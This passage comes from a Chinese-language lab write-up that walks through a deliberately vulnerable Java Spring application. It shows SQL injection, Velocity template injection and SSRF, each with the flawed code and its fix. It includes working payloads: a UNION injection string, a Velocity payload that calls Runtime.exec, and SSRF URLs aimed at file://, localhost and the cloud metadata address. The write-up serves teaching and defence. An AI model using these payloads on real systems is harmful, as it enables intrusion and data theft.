+                String res_name = rs.getString(&quot;username&quot;);
+                String res_pwd = rs.getString(&quot;password&quot;);
+                String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
+                result.append(info);
+                logger.info(info);
+            }
+            rs.close();
+            con.close();
+
+        } catch (ClassNotFoundException e) {
+            logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
+        } catch (SQLException e) {
+            logger.error(e.toString());
+        }
+        return result.toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>漏洞成因：直接插入username，造成sql注入</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>测试</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?username=-1&#39; union select 1,database(),3,4--+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png" alt="image-20250525202433620" loading="lazy" decoding="async"></figure><p>防护</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> 
+            // fix code
+            String sql = &quot;select * from users where username = ?&quot;;
+            PreparedStatement st = con.prepareStatement(sql);
+            st.setString(1, username);
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_2-sqli-jdbc-ps-vuln" tabindex="-1">2./sqli/jdbc/ps/vuln <a class="header-anchor" href="#_2-sqli-jdbc-ps-vuln" aria-label="Permalink to &quot;2./sqli/jdbc/ps/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)
+    public String jdbc_ps_vuln(@RequestParam(&quot;username&quot;) String username) {
+
+        StringBuilder result = new StringBuilder();
+        try {
+            Class.forName(driver);
+            Connection con = DriverManager.getConnection(url, user, password);
+
+            if (!con.isClosed())
+                System.out.println(&quot;Connecting to Database successfully.&quot;);
+
+            String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
+            PreparedStatement st = con.prepareStatement(sql);
+
+            logger.info(st.toString());
+            ResultSet rs = st.executeQuery();
+
+            while (rs.next()) {
+                String res_name = rs.getString(&quot;username&quot;);
+                String res_pwd = rs.getString(&quot;password&quot;);
+                String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
+                result.append(info);
+                logger.info(info);
+            }
+
+            rs.close();
+            con.close();
+
+        } catch (ClassNotFoundException e) {
+            logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
+            e.printStackTrace();
+        } catch (SQLException e) {
+            logger.error(e.toString());
+        }
+        return result.toString();
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>漏洞成因：预处理语句在sql语句之后，没起到防护的作用</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
+PreparedStatement st = con.prepareStatement(sql);
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png" alt="image-20250525203533438" loading="lazy" decoding="async"></figure><h4 id="_3-sqli-mybatis-vuln01" tabindex="-1">3./sqli/mybatis/vuln01 <a class="header-anchor" href="#_3-sqli-mybatis-vuln01" aria-label="Permalink to &quot;3./sqli/mybatis/vuln01&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/mybatis/vuln01&quot;)
+    public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) {
+        return userMapper.findByUserNameVuln01(username);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看findByUserNameVuln01</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@Select(&quot;select * from users where username = &#39;${username}&#39;&quot;)
+    List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这里用到的是MyBatis框架，用来指定 SQL 查询语句。<strong><code>${username}</code></strong>：在这里，<code>username</code> 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" alt="" loading="lazy" decoding="async"></figure><p>修复代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@Select(&quot;select * from users where username = #{username}&quot;)
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" alt="image-20250525210117585" loading="lazy" decoding="async"></figure><h4 id="_4-sqli-mybatis-vuln02" tabindex="-1">4./sqli/mybatis/vuln02 <a class="header-anchor" href="#_4-sqli-mybatis-vuln02" aria-label="Permalink to &quot;4./sqli/mybatis/vuln02&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/mybatis/vuln02&quot;)
+    public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) {
+        return userMapper.findByUserNameVuln02(username);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看findByUserNameVuln02</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">List&lt;User&gt; findByUserNameVuln02(String username);
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这里去掉了映射关系，不影响漏洞存在，仍然可以使用之前payload</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png" alt="image-20250525211935573" loading="lazy" decoding="async"></figure><h4 id="_5-sqli-mybatis-orderby-vuln03" tabindex="-1">5./sqli/mybatis/orderby/vuln03 <a class="header-anchor" href="#_5-sqli-mybatis-orderby-vuln03" aria-label="Permalink to &quot;5./sqli/mybatis/orderby/vuln03&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @GetMapping(&quot;/mybatis/orderby/vuln03&quot;)
+    public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) {
+        return userMapper.findByUserNameVuln03(sort);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看findByUserNameVuln03</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);
+</code></pre><button class="code-block-unfold-btn"></button></div><p>使用了MyBatis框架中的order字段，换用下面方法进行注入：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?sort=id desc--+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png" alt="image-20250525214518039" loading="lazy" decoding="async"></figure><h4 id="sql注入修复与防护" tabindex="-1">sql注入修复与防护 <a class="header-anchor" href="#sql注入修复与防护" aria-label="Permalink to &quot;sql注入修复与防护&quot;">​</a></h4><p>1.预编译</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">String sql = &quot;select * from users where username = ?&quot;;
+PreparedStatement st = con.prepareStatement(sql);
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>2.waf</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+<div id="app"></div>quot;);
+ public static String sqlFilter(String sql) {
+        if (!FILTER_PATTERN.matcher(sql).matches()) {
+            return null;
+        }
+        return sql;
+    
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>3.MyBatis防护</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@Select(&quot;select * from users where username = #{username}&quot;)
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="ssti" tabindex="-1">SSTI <a class="header-anchor" href="#ssti" aria-label="Permalink to &quot;SSTI&quot;">​</a></h3><h4 id="ssti-velocity" tabindex="-1">/ssti/velocity <a class="header-anchor" href="#ssti-velocity" aria-label="Permalink to &quot;/ssti/velocity&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">  @GetMapping(&quot;/velocity&quot;)
+    public void velocity(String template) {
+        Velocity.init();
+
+        VelocityContext context = new VelocityContext();
+
+        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);
+        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);
+        context.put(&quot;phone&quot;, &quot;555-1337&quot;);
+
+        StringWriter swOut = new StringWriter();
+        Velocity.evaluate(context, swOut, &quot;test&quot;, template);
+    }
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><a href="https://zhida.zhihu.com/search?content_id=247409254&amp;content_type=Article&amp;match_order=1&amp;q=Apache+Velocity&amp;zhida_source=entity" target="_blank" rel="noreferrer">Apache Velocity</a>是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和<a href="https://zhida.zhihu.com/search?content_id=247409254&amp;content_type=Article&amp;match_order=1&amp;q=%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B0%E6%8D%AE&amp;zhida_source=entity" target="_blank" rel="noreferrer">上下文数据</a>结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用</p><p>模版注入问题各个语言斗鱼，但这里只用到了velocity，除了velocity，thymeleaf等都是会有ssti问题</p><p><strong>Velocity.evaluate</strong></p><p><strong>方法介绍</strong></p><p>Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：</p><div class="language-text"><button title="Copy code" class="copy"></button><span class="lang">text</span><pre><code class="language-text">public static void evaluate(Context context, Writer writer, String templateName, String template)
+</code></pre><button class="code-block-unfold-btn"></button></div><p>参数说明：</p><ul><li>Context context：提供模板所需的数据上下文，可以包含多个键值对</li><li>Writer writer：输出流，用于写入生成的内容</li><li>String templateName：模板的名称，通常用于调试信息中</li><li>String template：要评估的模板字符串</li></ul><p>我们构造如下payload</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png" alt="image-20250527201721864" loading="lazy" decoding="async"></figure><h3 id="ssrf" tabindex="-1">SSRF <a class="header-anchor" href="#ssrf" aria-label="Permalink to &quot;SSRF&quot;">​</a></h3><h4 id="_1-ssrf-urlconnection-vuln" tabindex="-1">1./ssrf/urlConnection/vuln <a class="header-anchor" href="#_1-ssrf-urlconnection-vuln" aria-label="Permalink to &quot;1./ssrf/urlConnection/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = {RequestMethod.POST, RequestMethod.GET})
+    public String URLConnectionVuln(String url) {
+        return HttpUtils.URLConnection(url);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看URLConnection</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    public static String URLConnection(String url) {
+        try {
+            URL u = new URL(url);
+            URLConnection urlConnection = u.openConnection();
+            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
+            String inputLine;
+            StringBuilder html = new StringBuilder();
+
+            while ((inputLine = in.readLine()) != null) {
+                html.append(inputLine);
+            }
+            in.close();
+            return html.toString();
+        } catch (Exception e) {
+            logger.error(e.getMessage());
+            return e.getMessage();
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这里我们可以用文件读取协议file://实现访问</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png" alt="image-20250527205331156" loading="lazy" decoding="async"></figure><h4 id="_2-ssrf-httpurlconnection-vuln" tabindex="-1">2./ssrf/HttpURLConnection/vuln <a class="header-anchor" href="#_2-ssrf-httpurlconnection-vuln" aria-label="Permalink to &quot;2./ssrf/HttpURLConnection/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/HttpURLConnection/vuln&quot;)
+    public String httpURLConnectionVuln(@RequestParam String url) {
+        return HttpUtils.HttpURLConnection(url);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看HttpURLConnection</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    public static String HttpURLConnection(String url) {
+        try {
+            URL u = new URL(url);
+            URLConnection urlConnection = u.openConnection();
+            HttpURLConnection conn = (HttpURLConnection) urlConnection;
+//             conn.setInstanceFollowRedirects(false);
+//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
+            InputStream is = conn.getInputStream();  // send request
+            BufferedReader in = new BufferedReader(new InputStreamReader(is));
+            String inputLine;
+            StringBuilder html = new StringBuilder();
+
+            while ((inputLine = in.readLine()) != null) {
+                html.append(inputLine);
+            }
+            in.close();
+            return html.toString();
+        } catch (IOException e) {
+            logger.error(e.getMessage());
+            return e.getMessage();
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这里用HttpURLConnection做了强转，限制只能用http/htps协议，但可以访问内网其他主机</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png" alt="image-20250527210533999" loading="lazy" decoding="async"></figure><p>访问到了首页</p><h4 id="_3-ssrf-openstream" tabindex="-1">3./ssrf/openStream <a class="header-anchor" href="#_3-ssrf-openstream" aria-label="Permalink to &quot;3./ssrf/openStream&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/openStream&quot;)
+    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
+        InputStream inputStream = null;
+        OutputStream outputStream = null;
+        try {
+            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + &quot;.&quot; + WebUtils.getFileExtension(url);
+            // download
+            response.setHeader(&quot;content-disposition&quot;, &quot;attachment;fileName=&quot; + downLoadImgFileName);
+
+            URL u = new URL(url);
+            int length;
+            byte[] bytes = new byte[1024];
+            inputStream = u.openStream(); // send request
+            outputStream = response.getOutputStream();
+            while ((length = inputStream.read(bytes)) &gt; 0) {
+                outputStream.write(bytes, 0, length);
+            }
+
+        } catch (Exception e) {
+            logger.error(e.toString());
+        } finally {
+            if (inputStream != null) {
+                inputStream.close();
+            }
+            if (outputStream != null) {
+                outputStream.close();
+            }
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>可以通过这个路由实现任意文件下载：</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png" alt="image-20250527213236260" loading="lazy" decoding="async"></figure><h4 id="_4-ssrf-httpsyncclients-vuln" tabindex="-1">4./ssrf/HttpSyncClients/vuln <a class="header-anchor" href="#_4-ssrf-httpsyncclients-vuln" aria-label="Permalink to &quot;4./ssrf/HttpSyncClients/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> @GetMapping(&quot;/HttpSyncClients/vuln&quot;)
+    public String HttpSyncClients(@RequestParam(&quot;url&quot;) String url) {
+        return HttpUtils.HttpAsyncClients(url);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看HttpAsyncClients</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    public static String HttpAsyncClients(String url) {
+        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
+        try {
+            httpclient.start();
+            final HttpGet request = new HttpGet(url);
+            Future&lt;HttpResponse&gt; future = httpclient.execute(request, null);
+            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
+            return EntityUtils.toString(response.getEntity());
+        } catch (Exception e) {
+            return e.getMessage();
+        } finally {
+            try {
+                httpclient.close();
+            } catch (Exception e) {
+                logger.error(e.getMessage());
+            }
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们发现没有对url进行检查，所以可以使用ssrf</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png" alt="image-20250527213854753" loading="lazy" decoding="async"></figure><h4 id="_5-ssrf-resttemplate-vuln1" tabindex="-1">5./ssrf/restTemplate/vuln1 <a class="header-anchor" href="#_5-ssrf-resttemplate-vuln1" aria-label="Permalink to &quot;5./ssrf/restTemplate/vuln1&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/restTemplate/vuln1&quot;)
+    public String RestTemplateUrlBanRedirects(String url){
+        HttpHeaders headers = new HttpHeaders();
+        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
+        return httpService.RequestHttpBanRedirects(url, headers);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这段代码使用 <strong>Spring RestTemplate</strong> 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问</p><p>注：为什么需要加个/login</p><p>因为<a href="http://60.205.158.87:8080/%E4%BC%9A%E9%BB%98%E8%AE%A4%E8%B7%B3%E8%BD%AC%E5%88%B0/login%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E7%A6%81%E6%AD%A2%E4%BA%86%E9%87%8D%E5%AE%9A%E5%90%91" target="_blank" rel="noreferrer">http://60.205.158.87:8080/会默认跳转到/login，而代码禁止了重定向</a></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png" alt="image-20250527214625396" loading="lazy" decoding="async"></figure><p>既然已经禁止了重定向（Redirect），为什么 SSRF 仍然可能发生？</p><hr><p>一、什么是 SSRF？</p><p><strong>SSRF（Server-Side Request Forgery）</strong>，即服务器端请求伪造。攻击者控制一个参数，让服务器主动去访问一个由他指定的 URL，从而达到探测内网、打数据库、访问云元数据服务（如 AWS 的 <code>169.254.169.254</code>）等目的。</p><p><strong>核心问题：不是重定向，而是“服务器能不能发出请求”。</strong></p><hr><p>二、禁止重定向 vs SSRF 的区别</p><p>你禁止的是 <strong>HTTP 3xx 重定向</strong>，比如：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>用户访问 http://example.com =&gt; 返回 302 Location: http://malicious.com/internal
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这时候如果自动跟随重定向，就会去访问 <code>http://malicious.com/internal</code>。禁用重定向只防止了这种 <strong>间接跳转 SSRF</strong>。</p><p>✅ <strong>禁止重定向确实防止了这种“跳转型 SSRF”。</strong></p><hr><p>但是，<strong>普通 SSRF 根本不依赖重定向！</strong></p><p>比如你直接访问这个地址：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>http://127.0.0.1:3306/
+http://169.254.169.254/latest/meta-data/
+http://localhost:8080/actuator/env
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这些 URL <strong>根本不会返回 3xx 重定向</strong>，它们是直接请求目标服务，获取响应。</p><p>在你当前的代码中：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>httpService.RequestHttpBanRedirects(url, headers);
+</code></pre><button class="code-block-unfold-btn"></button></div><p>如果攻击者传的就是一个直连目标，比如：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?url=http://127.0.0.1:8080/
+</code></pre><button class="code-block-unfold-btn"></button></div><p>你不管重定向不重定向，<strong>请求都会直接发出去</strong>，SSRF 就发生了。</p><h4 id="_6-ssrf-resttemplate-vuln2" tabindex="-1">6./ssrf/restTemplate/vuln2 <a class="header-anchor" href="#_6-ssrf-resttemplate-vuln2" aria-label="Permalink to &quot;6./ssrf/restTemplate/vuln2&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">   @GetMapping(&quot;/restTemplate/vuln2&quot;)
+    public String RestTemplateUrl(String url){
+        HttpHeaders headers = new HttpHeaders();
+        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
+        return httpService.RequestHttp(url, headers);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这串代码没有禁止重定向，我们可以直接SSRF</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png" alt="image-20250528192945371" loading="lazy" decoding="async"></figure><h4 id="_7-ssrf-hutool-vuln" tabindex="-1">7./ssrf/hutool/vuln <a class="header-anchor" href="#_7-ssrf-hutool-vuln" aria-label="Permalink to &quot;7./ssrf/hutool/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;/hutool/vuln&quot;)
+public String hutoolHttp(String url){
+    return HttpUtil.get(url);
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这个库也能ssrf，但禁止了重定向</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png" alt="image-20250528194858386" loading="lazy" decoding="async"></figure><p>8./ssrf/denrebind/vuln</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;/dnsrebind/vuln&quot;)
+public String DnsRebind(String url) {
+    java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
+    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
+        return &quot;Dangerous url&quot;;
+    }
+    return HttpUtil.get(url);
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>来看checkSSRFWithoutRedirect</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> /**
+     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
+     * 存在问题：
+     *  1、TTL为0会被绕过
+     *  2、使用重定向可绕过
+     *
+     * @param url The url that needs to check.
+     * @return Safe url returns true. Dangerous url returns false.
+     */
+    public static boolean checkSSRFWithoutRedirect(String url) {
+        if(url == null) {
+            return false;
+        }
+        return !SSRFChecker.isInternalIpByUrl(url);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>来看isInternalIpByUrl函数</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">public static boolean isInternalIpByUrl(String url) {
+
+        String host = url2host(url);
+        if (host.equals(&quot;&quot;)) {
+            return true; // 异常URL当成内网IP等非法URL处理
+        }
+
+        String ip = host2ip(host);
+        if (ip.equals(&quot;&quot;)) {
+            return true; // 如果域名转换为IP异常，则认为是非法URL
+        }
+
+        return isInternalIp(ip);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p><p>给本地的hosts文件添加一条解析记录：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>192.168.1.43 www.baidu.com
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_8-ssrf-dnsrebind-vuln" tabindex="-1">8./ssrf/dnsrebind/vuln <a class="header-anchor" href="#_8-ssrf-dnsrebind-vuln" aria-label="Permalink to &quot;8./ssrf/dnsrebind/vuln&quot;">​</a></h4><p>漏洞代码</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;/dnsrebind/vuln&quot;)
+public String DnsRebind(String url) {
+    java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
+    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
+        return &quot;Dangerous url&quot;;
+    }
+    return HttpUtil.get(url);
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看checkSSRFWithoutRedirect函数</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> /**
+     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
+     * 存在问题：
+     *  1、TTL为0会被绕过
+     *  2、使用重定向可绕过
+     *
+     * @param url The url that needs to check.
+     * @return Safe url returns true. Dangerous url returns false.
+     */
+    public static boolean checkSSRFWithoutRedirect(String url) {
+        if(url == null) {
+            return false;
+        }
+        return !SSRFChecker.isInternalIpByUrl(url);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>isInternalIpByUrl</code>函数：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>public static boolean isInternalIpByUrl(String url) {
+
+        String host = url2host(url);
+        if (host.equals(&quot;&quot;)) {
+            return true; // 异常URL当成内网IP等非法URL处理
+        }
+
+        String ip = host2ip(host);
+        if (ip.equals(&quot;&quot;)) {
+            return true; // 如果域名转换为IP异常，则认为是非法URL
+        }
+
+        return isInternalIp(ip);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p><p>给本地的hosts文件添加一条解析记录：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>192.168.1.43 www.baidu.com
+</code></pre><button class="code-block-unfold-btn"></button></div><p>然后就可以实现ssrf</p><h4 id="ssrf的修复与防护" tabindex="-1">ssrf的修复与防护 <a class="header-anchor" href="#ssrf的修复与防护" aria-label="Permalink to &quot;ssrf的修复与防护&quot;">​</a></h4><p>（1）限制协议使用</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/urlConnection/sec&quot;)
+    public String URLConnectionSec(String url) {
+
+        // Decline not http/https protocol
+        if (!SecurityUtil.isHttp(url)) {
+            return &quot;[-] SSRF check failed&quot;;
+        }
+
+        try {
+            SecurityUtil.startSSRFHook();
+            return HttpUtils.URLConnection(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>isHttp函数</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> public static boolean isHttp(String url) {
+        return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>会检查 <code>url</code> 是否是 <code>http://</code> 或 <code>https://</code> 协议，如果不是则直接返回 <code>&quot;[-] SSRF check failed&quot;</code>，防止 <code>file://</code>、<code>ftp://</code>、<code>gopher://</code> 等协议的 SSRF 利用</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png" alt="image-20250724085008108" loading="lazy" decoding="async"></figure><p>（2）限制文件访问</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">   @GetMapping(&quot;/ImageIO/sec&quot;)
+    public String ImageIO(@RequestParam String url) {
+        try {
+            SecurityUtil.startSSRFHook();
+            HttpUtils.imageIO(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+        return &quot;ImageIO ssrf test&quot;;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>imageIO</code>函数：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">public static void imageIO(String url) {
+        try {
+            URL u = new URL(url);
+            ImageIO.read(u); // send request
+        } catch (IOException e) {
+            logger.error(e.getMessage());
+        }
+
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>（3）http请求检查</p><p>方法1：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/okhttp/sec&quot;)
+    public String okhttp(@RequestParam String url) {
+
+        try {
+            SecurityUtil.startSSRFHook();
+            return HttpUtils.okhttp(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>okhttp</code>函数：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">public static String okhttp(String url) throws IOException {
+    OkHttpClient client = new OkHttpClient();
+    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
+    return client.newCall(ok_http).execute().body().string();
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>方法2：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> @GetMapping(&quot;/httpclient/sec&quot;)
+    public String HttpClient(@RequestParam String url) {
+
+        try {
+            SecurityUtil.startSSRFHook();
+            return HttpUtils.httpClient(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+    }
+
